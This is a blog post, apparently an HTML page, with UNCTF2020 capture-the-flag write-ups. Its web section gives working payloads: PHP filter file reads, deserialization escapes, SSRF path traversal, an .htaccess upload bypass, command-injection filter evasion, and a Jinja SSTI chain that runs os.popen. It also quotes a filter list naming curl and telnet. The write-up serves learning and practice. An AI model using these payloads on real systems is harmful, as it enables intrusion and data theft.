@@ -1,0 +1,674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Pooka.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/Pooka.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"npfs06.top","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="第一次拿到名次的比赛，做出了27题">
+<meta property="og:type" content="website">
+<meta property="og:title" content="UNCTF2020">
+<meta property="og:url" content="https://npfs06.top/posts/UNCTF2020.html">
+<meta property="og:site_name" content="安小琪&#39;s blog">
+<meta property="og:description" content="第一次拿到名次的比赛，做出了27题">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img.npfs06.top/20210405213339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213349.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213358.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213409.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213418.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213440.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213453.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213504.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213512.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213523.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213538.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213551.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213559.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213608.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213642.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213713.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213728.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213739.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213801.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213814.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213823.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213836.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213847.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213859.jpeg?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213914.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213923.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213932.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213945.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405214005.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405213956.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405214022.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405214032.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405214053.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405214103.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="og:image" content="https://img.npfs06.top/20210405214115.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+<meta property="article:published_time" content="2020-11-14T13:30:51.000Z">
+<meta property="article:modified_time" content="2020-11-14T13:30:51.000Z">
+<meta property="article:author" content="安小琪">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img.npfs06.top/20210405213339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10">
+
+<link rel="canonical" href="https://npfs06.top/posts/UNCTF2020">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : false,
+    lang   : 'en'
+  };
+</script>
+
+  <title>UNCTF2020 | 安小琪's blog
+</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">安小琪's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">少年有梦，不应止于心动</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+  
+  
+
+          <div class="content page posts-expand">
+            
+
+    
+    
+    
+    <div class="post-block" lang="en">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline">UNCTF2020
+</h1>
+
+<div class="post-meta">
+  
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+          <p>第一次拿到名次的比赛，做出了27题<a id="more"></a></p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easyeval"><a href="#easyeval" class="headerlink" title="easyeval"></a>easyeval</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=include<span class="variable">$_GET</span>[<span class="string">&quot;npfs&quot;</span>]?&gt;&amp;npfs=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=flag.php</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://img.npfs06.top/20210405213339.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>base64解码即可</p>
+<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p>反序列化字符串逃逸</p>
+<p><img src="https://img.npfs06.top/20210405213349.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+  <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;s:<span class="number">92</span>:<span class="string">&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;easy&quot;</span>;&#125;&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;<span class="selector-tag">i</span>:<span class="number">1</span>;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>payload:</strong></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challengechallengechallengechallengechallengechallengechallenge&quot;;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;easy&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><p>考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF<br>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p>
+<ul>
+<li>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<a href="https://www.runoob.com/php/filter-validate-url.html" target="_blank">https://www.runoob.com/php/filter-validate-url.html</a></li>
+</ul>
+<p>题目中要求url中存在 unctf.com<br>我们可以构造类似 <code>unctf.com/../../../ </code> 这样的url，又因为我们需要查看flag文件</p>
+<p>最终payload为 <code>url=unctf.com/../../../../../flag</code></p>
+<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p>我们需要构造序列化后的username 和 password,但是我们不知道账号密码是什么（题目给的那个是迷惑你的）</p>
+<p>bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true</p>
+<p><img src="https://img.npfs06.top/20210405213358.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy-upload"></a>easy-upload</h2><p>emmm和 De1CTF2020的check in没啥区别似乎</p>
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">*</span><span class="symbol">*</span>perl|<span class="string">pyth</span>|<span class="string">ph</span>|<span class="string">auto</span>|<span class="string">curl</span>|<span class="string">base</span>|<span class="string">\</span>|<span class="string">&gt;</span>|<span class="string">rm</span>|<span class="string">ryby</span>|<span class="string">openssl</span>|<span class="string">war</span>|<span class="string">lua</span>|<span class="string">msf</span>|<span class="string">xter</span>|<span class="string">telnet in contents!**</span></span><br></pre></td></tr></table></figure>
+
+
+<p>过滤了这些东西</p>
+<p>经过测试发现我们上传的图片文件不能解析，因此我们可以上传一个<code>.htaccess</code>，添加其他后缀名解析为<code>.php</code>文件。如：<code>AddType application/x-httpd-php shell.ppt</code>。不过由于<code>php</code>字符串的过滤我们上传的文件不能包含<code>php</code>，因此我们上传的<code>.httacess</code>文件中的<code>php</code>可以用换行符绕过，对于上传了的<code>shell.ppt</code>文件，如果该php开启了短标签我们可以用短标签<code>&lt;?=</code>来代替<code>&lt;?php</code></p>
+<p><img src="https://img.npfs06.top/20210405213409.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p><img src="https://img.npfs06.top/20210405213418.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 管道符</span><br><span class="line"></span><br><span class="line">### windows 下</span><br><span class="line"></span><br><span class="line">&gt; &#96;|&#96;直接执行后面的语句</span><br><span class="line">&gt; &#96;||&#96;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&gt; &#96;&amp;&#96;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&gt; &#96;&amp;&amp;&#96;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Linux 下</span><br><span class="line"></span><br><span class="line">&gt; &#96;;&#96;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&gt; &#96;|&#96;直接执行后面的语句</span><br><span class="line">&gt; &#96;||&#96;如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句</span><br><span class="line">&gt; &#96;&amp;&#96;前面和后面命令都要执行，无论前面真假</span><br><span class="line">&gt; &#96;&amp;&amp;&#96;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</span><br></pre></td></tr></table></figure>
+<p>首先拿管道符测试下 127.0.0.1||ls</p>
+<p>发现可以正确输出，不过读文件的时候发现部分字符被过滤了</p>
+<p>先扫一下哪些字符被过滤了，808的这些都是被过滤了的</p>
+<p><img src="https://img.npfs06.top/20210405213431.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>看了下还有less没被过滤，空格用%09代替，一级级目录猜过去，一猜就中，文件名是flag，不过flag被过滤了，用下正则绕过 fla? </p>
+<p>payload如下：</p>
+<p><img src="https://img.npfs06.top/20210405213440.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="easyflask"><a href="#easyflask" class="headerlink" title="easyflask"></a>easyflask</h2><p>dirsearch扫目录，/login和/register</p>
+<p>注册admin,登入admin,这里题目没什么限制，可以直接注册admin,刚开始还以为考点是flask_session。。。。</p>
+<p>登入成功之后，回到初始页面</p>
+<p>提示 /secret_route_you_do_not_know</p>
+<p>到该目录，又提示 ‘guess’ the secret number </p>
+<p>所以 <code> http://url//secret_route_you_do_not_know?guess=&#123;&#123;config&#125;&#125;</code></p>
+<p>emmm.确定为SSTI</p>
+<p>爆破下看下哪些字符被过滤</p>
+<p><code>[  __   &quot;  </code>这些字符都被过滤了</p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">[] 可以用gentitem绕过，getitem的用法为：__mro__[2]== __mro__.__getitem__(2)</span></span><br><span class="line"><span class="xml">__ 和 &quot;(引号)可以用|attr绕过，例：</span><span class="template-variable">&#123;&#123;()|<span class="name">attr</span>(<span class="name">request.values.name1</span>)&#125;&#125;</span><span class="xml">&amp;name1=class</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">payload:</span></span><br><span class="line"><span class="xml">?guess=</span><span class="template-variable">&#123;&#123;()|<span class="name">attr</span>(<span class="name">request.args.x1</span>)|attr(<span class="name">request.args.x2</span>)|attr(<span class="name">request.args.x3</span>)()|attr(<span class="name">request.args.x4</span>)(<span class="name">117</span>)|attr(<span class="name">request.args.x5</span>)|attr(<span class="name">request.args.x6</span>)|attr(<span class="name">request.args.x4</span>)(<span class="name">request.args.x7</span>)|attr(<span class="name">request.args.x4</span>)(<span class="name">request.args.x8</span>)(<span class="name">request.args.x9</span>)&#125;&#125;</span><span class="xml">&amp;x1=__class__&amp;x2=__base__&amp;x3=__subclasses__&amp;x4=__getitem__&amp;x5=__init__&amp;x6=__globals__&amp;x7=__builtins__&amp;x8=eval&amp;x9=__import__(&quot;os&quot;).popen(&#x27;cat ./flag.txt&#x27;).read()</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://img.npfs06.top/20210405213453.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h2><p><img src="https://img.npfs06.top/20210405213504.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>有个url进去看下，是b站的，评论第一条就是flag<br><img src="https://img.npfs06.top/20210405213512.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h2><p>没啥好说的，直接拿存档编辑器，改下金币，到‘ 出题人商店 ’ 买下第三个hint3 就是flag</p>
+<h2 id="阴阳人编码"><a href="#阴阳人编码" class="headerlink" title="阴阳人编码"></a>阴阳人编码</h2><p>emmm Ook编码<br>“就这” 和 “不会吧” 全部替换成 Ook  ，倒过来的问号改成正过来的问号<br><img src="https://img.npfs06.top/20210405213523.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>解密网址：<a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<p><img src="https://img.npfs06.top/20210405213538.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<h2 id="YLB’s-CAPTCHA-签到题"><a href="#YLB’s-CAPTCHA-签到题" class="headerlink" title="YLB’s CAPTCHA - 签到题"></a>YLB’s CAPTCHA - 签到题</h2><p>验证码连着输对十次，就可以得到flag</p>
+<h2 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h2><p>后缀改成zip , 这个目录下 \list\xl\sharedStrings.xml</p>
+<p><img src="https://img.npfs06.top/20210405213551.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
+<p>base64解码就是flag </p>
+<h2 id="被删除的flag"><a href="#被删除的flag" class="headerlink" title="被删除的flag"></a>被删除的flag</h2><blockquote>
+<p>strings flag</p>
+</blockquote>
+<h2 id="撕坏的二维码"><a href="#撕坏的二维码" class="headerlink" title="撕坏的二维码"></a>撕坏的二维码</h2><p>emmmm. 直接找个正常的二维码，补一下就好</p>
